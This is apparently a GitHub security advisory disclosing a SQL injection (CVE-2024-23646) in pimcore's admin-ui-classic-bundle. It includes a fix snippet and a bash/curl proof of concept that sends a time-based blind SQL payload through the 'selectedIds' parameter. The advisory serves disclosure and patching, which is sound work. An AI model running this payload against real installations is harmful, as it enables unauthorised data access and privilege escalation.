# [H] SQL Injection in Admin download files as zip

## Summary
Severity: High
Advisory: GHSA-cwx6-4wmf-c6xv
CVE: CVE-2024-23646
CWE: CWE-89
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2024-01-24
Source: https://github.com/advisories/GHSA-cwx6-4wmf-c6xv
Type: github-advisory

## Affected
- Packagist: `pimcore/admin-ui-classic-bundle` — affected >=1.0.0 <1.3.2

## Details
### Summary
The application allows to create zip files from available files on the site. The parameter "selectedIds", is susceptible to SQL Injection.

### Details
[downloadAsZipJobsAction](https://github.com/pimcore/admin-ui-classic-bundle/blob/1.x/src/Controller/Admin/Asset/AssetController.php#L2006) escape parameters, but [downloadAsZipAddFilesAction](https://github.com/pimcore/admin-ui-classic-bundle/blob/1.x/src/Controller/Admin/Asset/AssetController.php#L2087) not.
The following code should be added:
```
  foreach ($selectedIds as $selectedId) {
      if ($selectedId) {
          $quotedSelectedIds[] = $db->quote($selectedId);
      }
  }
```

### PoC

- Set up an example project as described on https://github.com/pimcore/demon (demo package with example content)
- Log In. Grab the `X-pimcore-csrf-token` header from any request to the backend, as well as the `PHPSESSID` cookie.
- Run the following script, substituting the values accordingly: 
```
#!/bin/bash
BASE_URL=http://localhost # REPLACE THIS!
CSRF_TOKEN="5133f9d5d28de7dbab39e33ac7036271284ee42e" # REPLACE THIS!
COOKIE="PHPSESSID=4312797207ba3b342b29218fa42f3aa3" # REPLACE THIS!
SQL="(select*from(select(sleep(6)))a)"

curl "${BASE_URL}/admin/asset/download-as-zip-add-files?_dc=1700573579093&id=1&selectedIds=1,${SQL}&offset=10&limit=5&jobId=655cb18a37b01" \
    -X GET \
    -H "X-pimcore-csrf-token: ${CSRF_TOKEN}" \
    -H "Cookie: ${COOKIE}" `
```
- The response is delayed by 6 seconds.

### Impact
Any backend user with very basic permissions can execute arbitrary SQL statements and thus alter any data or escalate their privileges to at least admin level.

## References
- https://github.com/pimcore/admin-ui-classic-bundle/security/advisories/GHSA-cwx6-4wmf-c6xv
- https://nvd.nist.gov/vuln/detail/CVE-2024-23646
- https://github.com/pimcore/admin-ui-classic-bundle/commit/363afef29496cc40a8b863c2ca2338979fcf50a8
- https://github.com/pimcore/admin-ui-classic-bundle
- https://github.com/pimcore/admin-ui-classic-bundle/blob/1.x/src/Controller/Admin/Asset/AssetController.php#L2006
- https://github.com/pimcore/admin-ui-classic-bundle/blob/1.x/src/Controller/Admin/Asset/AssetController.php#L2087
- https://github.com/pimcore/admin-ui-classic-bundle/releases/tag/v1.3.2
